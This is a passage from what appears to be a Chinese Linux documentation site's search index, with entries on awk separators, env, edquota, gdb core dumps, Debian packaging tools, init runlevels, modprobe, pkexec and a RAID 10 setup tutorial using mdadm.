字段宽度列表（用空格键分隔）。 [A] FILENAME 当前输入文件的名。 [P] FNR 同NR，但相对于当前文件。 [A] FS 字段分隔符（默认是任何空格）。 [G] IGNORECASE 如果为真，则进行忽略大小写的匹配。 [A] NF 表示字段数，在执行过程中对应于当前的字段数。 [A] NR 表示记录数，在执行过程中对应于当前的行号。 [A] OFMT 数字的输出格式（默认值是%.6g）。 [A] OFS 输出字段分隔符（默认值是一个空格）。 [A] ORS 输出记录分隔符（默认值是一个换行符）。 [A] RS 记录分隔符（默认是一个换行符）。 [N] RSTART 由match函数所匹配的字符串的第一个位置。 [N] RLENGTH 由match函数所匹配的字符串的长度。 [N] SUBSEP 数组下标分隔符（默认值是34）。 BEGIN末尾的非0数字表示输出 这里非0数字可以理解为true: echo -e \"111\\n222\" | awk -v a=3 -v val=god 'BEGIN{FS=OFS=\",\"}{$a=val}1' 111,,god 222,,god awk中$NF是什么意思? #pwd /usr/local/etc ~# echo $PWD | awk -F/ '{print $NF}' etc #NF代表：浏览记录的域的个数 #$NF代表 ：最后一个Field(列) 原文链接:: https://blog.csdn.net/qq_41673534/article/details/80252016 linux：awk之RS、ORS与FS、OFS 把ORS理解成RS反过程，这样更容易记忆和理解 ，看下面的例子: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1 //awk '{print $0}' test1二者是一样的 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1 111 222|333 444|555 666| FS为空的时候: [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}' 1 1 1 | 2 2 2 | 3 3 3 当FS为空的时候，awk会把一行中的每个字符，当成一列来处理 。 关于Field与Record 什么是field（字段），什么是record（记录行）？ 示例: 1.txt 1. i am a student. 2. i like to swim 3. hello moto 1代表第一个记录行，2代表第二个记录行，3代表第三个记录行。 通过观察我们可以知道总共有3个记录行（record）。 看看第一行：\"i am a student\"，这一行的每个单词都是一个字段（field）。 \"i\"是一个字段，\"am\"是一个字段，\"a\"是一个字段，\"student\"是一个字段， 该行总共有4个字段。 RS 记录行分隔符, 示例: 1.txt 1. a\\n 2. b\\n 3. c\\n 4. d\\n 5. e\\n 该文本总共有5行，每一行都有一个换行符\"n\"。 所以每行记录都是以\"n\"为一个（换行的）标志。 可以用以下方法来理解： 找到某某标志，让每个某某后的内容重新变成一行 示例: 1.txt a|b|c 代码: awk 'BEGIN{ RS=\"|\"; } { print $0 }' a b b ORS 可以看成RS的逆向过程, 示例: 1.txt a b c 可以这样理解： 观察每一行的\"换行符号\"，然后将\"换行符号\"替换成你想要的符号: awk 'BEGIN{ ORS=\"----\" }{ print $0 }' 1.txt a----b----c---- FS 字段分隔符 FS默认值为\" （空格）\",如\"hello moto\". 在\"hello moto\"中有一个空格，空格就是hello与moto的分隔符（separator），而hello与moto就为字段（files）。awk以空格来区分。 在看看\"i----love----you\",如果我们用命令\"awk \"{ print $1 }\"\"会看到结果为: i----love----you 如果想打印出三个字母，通过观察可发现\"----\"为分隔符: awk 'BEGIN{ FS=\"----\";}{ print $1,$2,$3 }' filename i love you OFS 输出的字段分隔符。 这么解释吧，如上例中\"i----love----you\"，\"----\"为分隔符(FS)，如果我们想改为用其他符号显示可以这样: awk 'BEGIN{ FS=\"----\";OFS=\"*****\" }{ print $1,$2,$3 }' filename i*****love*****you 其实OFS还有一个例子: echo \"abc\" | awk '{ OFS=\".\" } { NF=NF; print NF,$0}' 结果: 1.abc PS RS与ORS可以说成是一个互逆的过程（↔）也可以看成一个替换的过程， 但是看成互逆的过程比较好理解；FS与OFS就是一个替换的过程。 RS,ORS,FS,OFS区别和联系 平常用的: print $0 等价于: printf $0 ORS RS与ORS RS是记录分隔符，默认的分隔符是 \\n ，具体用法看下: [root@krlcgcms01 mytest]# cat test1 //测试文件 111 222 333 444 555 666 RS默认分割符 \\n : [root@krlcgcms01 mytest]# awk '{print $0}' test1 //awk 'BEGIN{RS=\"\\n\"}{print $0}' test1 这二个是一样的 111 222 333 444 555 666 其实你可以把上面test1文件里的内容理解为: 111 222\\n333 444\\n555 6666 利用 \\n 进行分割。看下一个例子 自定义RS分割符 : [zhangy@localhost test]$ echo \"111 222|333 444|555 666\"|awk 'BEGIN{RS=\"|\"}{print $0,RT}' 111 222 | 333 444 | 555 666 结合上面一个例子，就很容易理解RS的用法了 RS也可能是正则表达式 : [zhangy@localhost test]$ echo \"111 222a333 444b555 666\"|awk 'BEGIN{RS=\"[a-z]+\"}{print $1,RS,RT}' 111 [a-z]+ a 333 [a-z]+ b 555 [a-z]+ 从例3和例4，我们可以发现一点， 当RT是利用RS匹配出来的内容。如果RS是某个固定的值时，RT就是RS的内容 。 RS为空时 : [zhangy@localhost test]$ cat -n test2 1 111 222 2 3 333 444 4 333 444 5 6 7 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"\"}{print $0}' test2 111 222 333 444 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"\";}{print \"<\",$0,\">\"}' test2 //这个例子看着比较明显 < 111 222 > < 333 444 //这一行和下面一行，是一行 333 444 > < 555 666 > 从这个例子， 可以看出当RS为空时，awk会自动以多行来做为分割符 。 ORS记录输出分符符，默认值是 ``n`` 把ORS理解成RS反过程，这样更容易记忆和理解 ，看下面的例子: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1 //awk '{print $0}' test1二者是一样的 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1 111 222|333 444|555 666| FS与OFS FS指定列分割符 : [zhangy@localhost test]$ echo \"111|222|333\"|awk '{print $1}' 111|222|333 [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"|\"}{print $1}' 111 FS也可以用正则 : [zhangy@localhost test]$ echo \"111||222|333\"|awk 'BEGIN{FS=\"[|]+\"}{print $1}' 111 FS为空的时候 : [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}' 1 1 1 | 2 2 2 | 3 3 3 当FS为空的时候，awk会把一行中的每个字符，当成一列来处理 。 RS被设定成非 ``n`` 时， ``n`` 会成FS分割符中的一个 [zhangy@localhost test]$ cat test1 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"444\";}{print $2,$3}' test1 222 333 666 222和333之间是有一个 ``n`` 的，当RS设定成444后，222和333被认定成同一行的二列了，其实按常规思想是二行的一列才对 。 OFS列输出分隔符 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1,$2}' test1 111|222 333|444 555|666 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1 OFS $2}' test1 111|222 333|444 555|666 test1只有二列，如果100列，都写出来太麻烦了吧。 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $0}' test1 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{NF=NF;print $0}' test1 111|222 333|444 555|666 为什么第二种方法中的OFS生效呢？个人觉得， awk觉查到列有所变化时，就会让OFS生效 ，没变化直接输出了。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AWK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AWK.html"},{"title":"env","text":"env 显示系统中已经存在的环境变量（当前用户），只使用\"-\"时，隐藏了\"-i\"的功能 -i 开始一个新的空环境 -u <变量名> 从当前环境中删除指定的变量 其他用法, 临时为某个执行的cmd设置一个环境变量, 仅在执行的这个cmd生效: env var=xxx cmd set不加任何参数显示结果于env的区别 set 命令 set 命令会显示当前 shell 的环境变量和位置参数， 以及其他与当前 shell 会话相关的设置（如 shell 函数和别名）. 它还会显示一些内部变量和状态信息. 输出结果包含更多与 shell 相关的信息，而不仅仅是环境变量. 此外，set 命令还可以用于设置变量或修改 shell 的行为. env 命令 env 命令会显示当前环境中的环境变量. 它主要用于显示环境变量的值，而不包含其他与 shell 会话相关的信息. env 命令的输出结果通常比较简洁，只包含环境变量的名称和值。 区别 /docs/操作系统/linux/概念性/指令export、env、set三者的区别","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ENV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ENV.html"},{"title":"edquota","text":"修改用户（群组）的磁盘配额 edit quota 缩写，用于修改用户和群组的配额限制参数， 包括磁盘容量和文件个数限制、软限制和硬限制值、宽限时间， 该命令的基本格式有以下 3 种: [root@localhost ~]# edquota [-u 用户名] [-g 群组名] [root@localhost ~]# edquota -t [root@localhost ~]# edquota -p 源用户名 -u 新用户名 此命令各常用选项及功能如下： -u 用户名 进入配额的 Vi 编辑界面，修改针对用户的配置值； -g 群组名 进入配额的 Vi 编辑界面，修改针对群组的配置值； -t 修改配额参数中的宽限时间； -p 将源用户（或群组）的磁盘配额设置，复制给其他用户（或群组） 例如，以用户 myquota 为例，通过如下命令配置此命令的 Quota: [root@localhost ~]# edquota -u myquota Disk quotas for user myquota (uid 710): Filesystem blocks soft hard inodes soft hard /dev/hda3 80 0 0 10 0 0 此命令的输出信息共 3 行， 第一行指明了针对哪个用户进行配额限制， 第二行是各个配额值的表头， 共分为 7 列，其每一列的含义 文件系统（filesystem） 说明该限制值是针对哪个文件系统（或分区）； 磁盘容量（blocks） 此列的数值是 quota 自己算出来的，单位为 Kbytes，不要手动修改； 磁盘容量的软限制（soft） 当用户使用的磁盘空间超过此限制值，则用户在登陆时会收到警告信息，告知用户磁盘已满，单位为 KB； 磁盘容量的硬限制（hard） 要求用户使用的磁盘空间最大不能超过此限制值，单位为 KB； 文件数量（inodes） 同 blocks 一样，此项也是 quota自己计算出来的，无需手动修改； 文件数量的软限制（soft） 当用户拥有的文件数量超过此值，系统会发出警告信息； 文件数量的硬限制（hard） 用户拥有的文件数量不能超过此值。 注意，当 soft/hard 为 0 时，表示没有限制。 另外，在 Vi（或 Vim）中修改配额值时，填写的数据无法保证同表头对齐， 只要保证此行数据分为 7 个栏目即可。 【例 1】 修改用户 myquota 的软限制值和硬限制值: [root@localhost ~]# edquota -u myquota Disk quotas for user myquota (uid 710): Filesystem blocks soft hard inodes soft hard /dev/hda3 80 250000 300000 10 0 0 【例 2】 修改群组 mygrpquota 的配额: [root@localhost ~]# edquota -g mygrpquota Disk quotas for group mygrpquota (gid 713): Filesystem blocks soft hard inodes soft hard /dev/hda3 400 900000 1000000 50 0 0 【例 3】修改宽限天数: [root@localhost ~]# edquota -t Grace period before enforcing soft limits for users: Time units may be: days, hours, minutes, or seconds Filesystem Block grace period Inode grace period /dev/hda3 14days 7days","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Edquota.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Edquota.html"},{"title":"gdb","text":"使用: bt #打印当前的堆栈信息 backtrace 常用模板: gdb exefile corefile -x script gdb --core corefile exefile -x script gbd -c corefile exefile -x script gdb exefile corefile < script 前三者基本等价，最后一个不确定 常用选项 -n x , -n 不执行任何初始化文件里的命令。通常在处理所有的命令此选项和参数之后，GDB 会执行这些文件里的命令。 -q uite , -s ilent , -q \"安静模式\"，不打印介绍和版权信息。在批处理模式下也不打印。 -b atch 以批处理模式运行。 处理完所有命令文件后以 0 状态推出。批处理模式将在 GDB 作为过滤器运的时候很有用，例如下载和运行一个远程计算机上的程序。 -symbols <file>, -s <file> 从指定的文件中读取符号表。 -se <file> 从指定文件中读取符号表信息，并把它用在可执行文件中。 -core <file>, -c <file> 调试 core dump 的 core 文件， core dump 叫做核心转储，它是进程运行时在突然崩溃的那一刻的一个内存快照，操作系统在程序发生异 常而异常在进程内部又没有被捕获的情况下，会把进程此刻内存、寄存器状态、运行堆栈等信息转储保存在一个文件里。 -directory <directory>, -d <directory> 加入一个源文件的搜索路径。默认搜索路径是环境变量中的 PATH 所定义的路径。 -tty device, -t device 将设备作为程序的标准输入输出。 -t ui 在启动时激活文本用户接口。文本用户接口在终端上管理多种文本窗口，用来显示代码，汇编，寄存器和 GDB 命令的输出。 -w rite 以可读可写的方式打开可执行程序和 core 文件，和 set write on 命令相同。 -s tatistics 在每次完成命令和回收到提示符的时候，此选项可让 GDB 打印时间和内存使用统计信息。 -v ersion 此选项可让 GDB 打印版本号和非保障性的声明然后退出 常用的command code: run #运行 info xxx #显示xxx信息 bt #显示堆栈 continue #中断后继续运行到下一个断点 step #单步执行，进入函数 next #单步执行 return #函数未执行完，忽略未执行的语句，返回。 finish #函数执行完毕返回。 call #调用某一个函数 fun(\"1234\") (backtrace)bt #显示栈桢 bt N #显示开头N个栈桢 bt -N #显示最后N个栈桢 (frame)f N #显示第N层栈桢 list #显示源码 set directory #设置gdb的工作目录 pwd #当前的工作目录 关于gdb的core文件 Core Dump Core的意思是内存，Dump的意思是扔出来，堆出来。 开发和使用Unix程序时，有时程序莫名其妙的down了，却没有任何的提示(有时候会提示core dumped)， 这时候可以查看一下有没有形如 core.进程号 的文件生成， 这个文件便是操作系统把程序down掉时的内存内容扔出来生成的, 它可以做为调试程序的参考 生成Core文件 一般默认情况下，core file的大小被设置为了0，这样系统就不dump出core file了。修改后才能生成core文件: #设置core大小为无限 ulimit -c unlimited #设置文件大小为无限 ulimit unlimited 这些需要有root权限, 在ubuntu下每次重新打开中断都需要重新输入上面的第一条命令, 来设置core大小为无限 core文件生成路径 输入可执行文件运行命令的同一路径下。 若系统生成的core文件不带其他任何扩展名称，则全部命名为core。新的core文件生成将覆盖原来的core文件。 /proc/sys/kernel/core_uses_pid可以控制core文件的文件名中是否添加pid作为扩展。 文件内容为1，表示添加pid作为扩展名，生成的core文件格式为core.xxxx；为0则表示生成的core文件同一命名为core。 可通过以下命令修改此文件: echo \"1\" > /proc/sys/kernel/core_uses_pid proc/sys/kernel/core_pattern可以控制core文件保存位置和文件名格式。 可通过以下命令修改此文件: echo \"/corefile/core-%e-%p-%t\" > core_pattern 可以将core文件统一生成到/corefile目录下，产生的文件名为core-命令名-pid-时间戳 以下是参数列表: %p - insert pid into filename 添加pid %u - insert current uid into filename 添加当前uid %g - insert current gid into filename 添加当前gid %s - insert signal that caused the coredump into the filename 添加导致产生core的信号 %t - insert UNIX time that the coredump occurred into filename 添加core文件生成时的unix时间 %h - insert hostname where the coredump happened into filename 添加主机名 %e - insert coredumping executable name into filename 添加命令名 用gdb查看core文件 发生core dump之后, 用gdb进行查看core文件的内容, 以定位文件中引发core dump的行: gdb [exec file] [core file] 如: gdb ./test core # 或gdb ./a.out core-file core.xxxx gdb后, 用bt命令backtrace或where查看程序运行到哪里, 来定位core dump的文件->行. 待调试的可执行文件，在编译的时候需要加-g，core文件才能正常显示出错信息: gdb -core=core.xxxx file ./a.out bt gdb -c core.xxxx file ./a.out bt 用gdb实时观察某进程crash信息 启动进程: gdb -p PID c 运行进程至crash gdb会显示crash信息: bt 总结为两种情况 进程意外死亡或者崩溃，在对 core 的限制不为0的情况下可发生 core dump 生成 core 文件 如需对当时的情况进行排查，则需执行: gdb execfile corefile 跟踪已经存在的一个pid进行调试直至该pid崩溃 code: gdb -p pid Python使用gdb调试 启动有两种方式 1、交互式: $ gdb python ... (gdb) run <programname>.py <arguments> 2、自动: $ gdb -ex r --args python <programname>.py <arguments> 调试: bt #查看c调用堆栈 py-by #查看python调用栈 info threads #相关线程信息 py-list #查看python代码运行到哪里 thread apply all py-list #查看所有进程的pyhton代码位置 python gdb extension在gdb的环境下提供了如下几个py命令: py-list 查看当前python应用程序上下文 py-bt 查看当前python应用程序调用堆栈 py-bt-full 查看当前python应用程序调用堆栈，并且显示每个frame的详细情况 py-print 查看python变量 py-locals 查看当前的scope的变量 py-up 查看上一个frame py-down 查看下一个frame","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GDB.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GDB.html"},{"title":"debbuild","text":"deb完整构建可参考: /docs/操作系统/linux/教程/本地构建deb包 deb包需要的目录结构构建好后 (可使用 /docs/操作系统/linux/linux指令/debmake 来构建目录结构), 通过此命令来构建完整的deb包. debbuild 读取软件包的源代码目录中的 debian/rules` 文件来执行构建过程， 并自动处理构建过程中的许多步骤，例如配置、编译和安装. debuild 还会检查构建依赖关系并确保它们已满足，以及生成符合 Debian 软件包规范的二进制和源代码软件包. 相对而言 /docs/操作系统/linux/linux指令/dpkg 更底层一点, 只需要编译好的代码与目录结构即可.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debbuild.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debbuild.html"},{"title":"debmake","text":"需要构建 debian 的软件包(deb包)时, 可通过此命令自动生成需要的deb目录结构. deb包构建可参考: /docs/操作系统/linux/教程/本地构建deb包 一般与 /docs/操作系统/linux/linux指令/debbuild 一起使用, 如: $ tar -xzmf debhello-0.0.tar.gz $ cd debhello-0.0 $ debmake ... manual customization $ debuild ...","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debmake.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-debmake.html"},{"title":"init","text":"这涉及到 /docs/操作系统/linux/概念性/Linux系统的启动过程 支持的参数: 0 关机 1 单用户状态(root) 2 多用户状态(无NFS, 即不能使用net file system, 不联网) 3 多用户状态(有NFS, 标准的运行级) 4 保留, 未使用 5 进入GUI图形界面(X11、xwindow) 6 重启 init 进程是系统所有进程的起点，可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。 init 程序首先是需要读取配置文件 /etc/inittab(根据使用机制的不同读取不通的配置文件, 比如Ubuntu使用的是Upstart机制, 相关配置文件为/etc/init/rc-sysinit.conf) 运行级别 许多程序需要开机启动。它们在Windows叫做\"服务\"（service），在Linux就叫做\"守护进程\"（daemon）。 init进程的一大任务，就是去运行这些开机启动的程序。 但是，不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。 Linux允许为不同的场合，分配不同的开机启动程序，这就叫做\"运行级别\"（runlevel）。也就是说，启动时根据\"运行级别\"，确定要运行哪些程序。 查看当前运行级别可使用 /docs/操作系统/linux/linux指令/runlevel Linux系统有7个运行级别(runlevel), 也就是init指令支持的参数： 运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动 运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登录 运行级别2：多用户状态(没有NFS) 运行级别3：完全的多用户状态(有NFS)，登录后进入控制台命令行模式 运行级别4：系统未使用，保留 运行级别5：X11控制台，登录后进入图形GUI模式 运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动 系统初始化 在init的配置文件中有这么一行: si::sysinit:/etc/rc.d/rc.sysinit 它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本， 它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。 它主要完成的工作有: 激活交换分区 检查磁盘 加载硬件模块 一些需要优先执行任务。 如下面的内容: l5:5:wait:/etc/rc.d/rc 5 表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数， 去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件， 而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。 而这些rc启动脚本有着类似的用法，它们一般能接受start、stop、restart、status等参数。 /etc/rc.d/rc5.d/中的rc启动脚本通常是K或S开头的连接文件，对于以 S 开头的启动脚本，将以start参数来运行。 而如果发现存在相应的脚本也存在K打头的连接，而且已经处于运行态了(以/var/lock/subsys/下的文件作为标志)， 则将首先以stop为参数停止这些已经启动了的守护进程，然后再重新运行。 这样做是为了保证是当init改变运行级别时，所有相关的守护进程都将重启。 至于在每个运行级中将运行哪些守护进程，用户可以通过chkconfig或setup中的\"System Services\"来自行设定。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-init.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-init.html"},{"title":"modprobe","text":"内核模块可见: /docs/操作系统/linux/系统服务/内核模块 -a , --all 载入全部的模块。 -c , --show-conf 显示所有模块的设置信息。 -d , --debug 使用排错模式。 -l , --list 显示可用的模块。 -r , --remove 若在命令指定模块,则删除指定模块,否则,指定\"自动清除\"模式 -t , --type 指定模块类型。 -v , --verbose 执行时显示详细的信息。 -V , --version 显示版本信息。 -h elp 显示帮助。 -C , --configconfig file 指定配置文件.默认使用/etc/modules.conf文件为配置文件 -c 列出目前系统所有的模组！(更详细的代号对应表) -l 列出目前在/lib/modules/ uname-r /kernel当中的所有模组完整档名； -f 强制载入该模组； -r 类似 rmmod ，就是移除某个模组啰～","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-modprobe.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-modprobe.html"},{"title":"pkexec","text":"linux桌面系统下申请提权指令, 是一个用于Linux的通用工具， 它并不限于特定的桌面环境. 可在多个桌面系统中使用，包括但不限于: GNOME KDE Plasma Xfce LXQt Cinnamon MATE 用法: pkexec [--user username] <需要提权的指令/程序> [参数列表] 特别说明, pkexec执行脚本时, 虽然可能会一开始有 DISPLAY , 但是使用bash执行脚本时, 不会自动将 DISPLAY 这个环境变量给读进去, 如: pkexec bash xxx.sh xxx.sh 脚本内获取的 DISPLAY 为空, 详见 /docs/操作系统/linux/Linux环境变量/DISPLAY","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkexec.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-pkexec.html"},{"title":"whoami","text":"查看正在使用的用户","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whoami.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-whoami.html"},{"title":"设置 RAID 10 或 1 + 0 (嵌套)","text":"参考:: 作者: Babin Lonston 译者: LCTT 译者: struggling < https://linux.cn/portal.php?mod=comment&id=6122&idtype=aid >`_ RAID 10 是组合 RAID 1 和 RAID 0 形成的。 要设置 RAID 10，我们至少需要4个磁盘。 在之前的文章中，我们已经看到了如何使用最少两个磁盘设置 RAID 1 和 RAID 0。 在这里，我们将使用最少4个磁盘组合 RAID 1 和 RAID 0 来设置 RAID 10。 假设我们已经在用 RAID 10 创建的逻辑卷保存了一些数据。 比如我们要保存数据 \"TECMINT\"，它将使用以下方法将其保存在4个磁盘中。 在 Linux 中创建 Raid 10（LCTT 译注：原图有误，已修正） RAID 10 是先做镜像，再做条带。 因此，在 RAID 1 中，相同的数据将被写入到两个磁盘中，\"T\"将同时被写入到第一和第二个磁盘中。 接着的数据被条带化到另外两个磁盘，\"E\"将被同时写入到第三和第四个磁盘中。 它将继续循环此过程，\"C\"将同时被写入到第一和第二个磁盘，以此类推。 注解 （LCTT 译注：原文中此处描述混淆有误，已经根据实际情况进行修改。） 现在你已经了解 RAID 10 怎样组合 RAID 1 和 RAID 0 来工作的了。 如果我们有4个20 GB 的磁盘，总共为 80 GB，但我们将只能得到40 GB 的容量，另一半的容量在构建 RAID 10 中丢失。 RAID 10 的优点和缺点 提供更好的性能。 在 RAID 10 中我们将失去一半的磁盘容量。 读与写的性能都很好，因为它会同时进行写入和读取。 它能解决数据库的高 I/O 磁盘写操作。 要求 在 RAID 10 中，我们至少需要4个磁盘，前2个磁盘为 RAID 1，其他2个磁盘为 RAID 0， 就像我之前说的，RAID 10 仅仅是组合了 RAID 0和1。 如果我们需要扩展 RAID 组，最少需要添加4个磁盘。 服务器设置: 操作系统 : CentOS 6.5 FinalIP 地址 : 192.168.0.229 主机名 : rd10.tecmintlocal.com 磁盘 1 [20GB] : /dev/sdd 磁盘 2 [20GB] : /dev/sdc 磁盘 3 [20GB] : /dev/sdd 磁盘 4 [20GB] : /dev/sde 有两种方法来设置 RAID 10，在这里两种方法我都会演示，但我更喜欢第一种方法，使用它来设置 RAID 10 更简单。 方法1：设置 RAID 10 首先，使用以下命令确认所添加的4块磁盘没有被使用: ls -l /dev | grep sd 四个磁盘被检测后，然后来检查磁盘是否存在 RAID 分区: mdadm -E /dev/sd[b-e]### mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或 验证添加的4块磁盘 注解 在上面的输出中，如果没有检测到 super-block 意味着在4块磁盘中没有定义过 RAID。 第1步：为 RAID 分区, 现在，使用 fdisk ，命令为4个磁盘(/dev/sdb, /dev/sdc, /dev/sdd 和 /dev/sde)创建新分区: fdisk /dev/sdb fdisk /dev/sdc fdisk /dev/sdd fdisk /dev/sde 为 /dev/sdb 创建分区, 我来告诉你如何使用 fdisk 为磁盘(/dev/sdb)进行分区，此步也适用于其他磁盘: fdisk /dev/sdb 请使用以下步骤为 /dev/sdb 创建一个新的分区。 按 n 创建新的分区。 然后按 P 选择主分区。 接下来选择分区号为1。 只需按两次回车键选择默认值即可。 然后，按 P 来打印创建好的分区。 按 L ，列出所有可用的类型。 按 t 去修改分区。 键入 fd 设置为 Linux 的 RAID 类型，然后按 Enter 确认。 然后再次使用 p 查看我们所做的更改。 使用 w 保存更改。 为磁盘 sdb 分区 注解 请使用上面相同的指令对其他磁盘(sdc, sdd sdd sde)进行分区。 创建好4个分区后，需要使用下面的命令来检查磁盘是否存在 raid: mdadm -E /dev/sd[b-e] # mdadm --examine /dev/sdb /dev/sdc /dev/sdd /dev/sde ### 或 mdadm -E /dev/sd[b-e]1 # mdadm --examine /dev/sdb1 /dev/sdc1 /dev/sdd1 /dev/sde1 ### 或 检查磁盘 注解 以上输出显示，新创建的四个分区中没有检测到 super-block， 这意味着我们可以继续在这些磁盘上创建 RAID 10。 第2步: 创建 RAID 设备 md 现在该创建一个`md`（即 /dev/md0）设备了，使用\"mdadm\" raid 管理工具。 在创建设备之前，必须确保系统已经安装了`mdadm`工具，如果没有请使用下面的命令来安装: yum install mdadm [在 RedHat 系统]### apt-get install mdadm [在 Debain 系统] mdadm`工具安装完成后，可以使用下面的命令创建一个 `md raid 设备: mdadm --create /dev/md0 --level=10 --raid-devices=4 /dev/sd[b-e]1 接下来使用 cat 命令验证新创建的 raid 设备: cat /proc/mdstat 创建 md RAID 设备 接下来，使用下面的命令来检查4个磁盘。下面命令的输出会很长，因为它会显示4个磁盘的所有信息: mdadm --examine /dev/sd[b-e]1 接下来，使用以下命令来查看 RAID 阵列的详细信息: mdadm --detail /dev/md0 查看 RAID 阵列详细信息 注解 你在上面看到的结果，该 RAID 的状态是 active 和re-syncing。 第3步：创建文件系统 使用 ext4 作为 md0 的文件系统，并将它挂载到 /mnt/raid10 下。 在这里，我用的是 ext4，你可以使用你想要的文件系统类型: mkfs.ext4 /dev/md0 创建 md 文件系统 在创建文件系统后，挂载文件系统到 /mnt/raid10 下，并使用 ls -l 命令列出挂载点下的内容: mkdir /mnt/raid10 mount /dev/md0 /mnt/raid10/ ls -l /mnt/raid10/ 接下来，在挂载点下创建一些文件，并在文件中添加些内容，然后检查内容: touch /mnt/raid10/raid10_files.txt ls -l /mnt/raid10/ echo \"raid 10 setup with 4 disks\" > /mnt/raid10/raid10_files.txt cat /mnt/raid10/raid10_files.txt 挂载 md 设备 要想自动挂载，打开`/etc/fstab`文件并添加下面的条目，挂载点根据你环境的不同来添加。使用 wq! 保存并退出: vim /etc/fstab/dev/md0 /mnt/raid10 ext4 defaults 0 0 挂载 md 设备 接下来，在重新启动系统前使用`mount -a`来确认`/etc/fstab`文件是否有错误: mount -av 检查 Fstab 中的错误 第四步：保存 RAID 配置 默认情况下 RAID 没有配置文件，所以我们需要在上述步骤完成后手动保存它: mdadm --detail --scan --verbose >> /etc/mdadm.conf 保存 RAID10 的配置 就这样，我们使用方法1创建完了 RAID 10，这种方法是比较容易的。现在，让我们使用方法2来设置 RAID 10。 方法2：创建 RAID 10 在方法2中，我们必须定义2组 RAID 1，然后我们需要使用这些创建好的 RAID 1 的集合来定义一个 RAID 0。 在这里，我们将要做的是先创建2个镜像（RAID1），然后创建 RAID0 （条带化）。 首先，列出所有的可用于创建 RAID 10 的磁盘: ls -l /dev | grep sd 列出了 4 个设备 将4个磁盘使用 fdisk 命令进行分区。对于如何分区，您可以按照上面的第1步: fdisk /dev/sdb### fdisk /dev/sdc### fdisk /dev/sdd### fdisk /dev/sde 在完成4个磁盘的分区后，现在检查磁盘是否存在 RAID块: mdadm --examine /dev/sd[b-e] mdadm --examine /dev/sd[b-e]1 检查 4 个磁盘 第1步：创建 RAID 1 首先，使用4块磁盘创建2组 RAID 1，一组为 sdb1 和 sdc1 ，另一组是 sdd1 和 sde1 mdadm --create /dev/md1 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[b-c]1 mdadm --create /dev/md2 --metadata=1.2 --level=1 --raid-devices=2 /dev/sd[d-e]1 cat /proc/mdstat 创建 RAID 1 查看 RAID 1 的详细信息 第2步：创建 RAID 0 接下来，使用 md1 和 md2 来创建 RAID 0: mdadm --create /dev/md0 --level=0 --raid-devices=2 /dev/md1 /dev/md2 cat /proc/mdstat 创建 RAID 0 第3步：保存 RAID 配置 我们需要将配置文件保存在 /etc/mdadm.conf 文件中，使其每次重新启动后都能加载所有的 RAID 设备: mdadm --detail --scan --verbose >> /etc/mdadm.conf 在此之后，我们需要按照方法1中的第3步来创建文件系统。 就是这样！我们采用的方法2创建完了 RAID 1+0。我们将会失去一半的磁盘空间，但相比其他 RAID 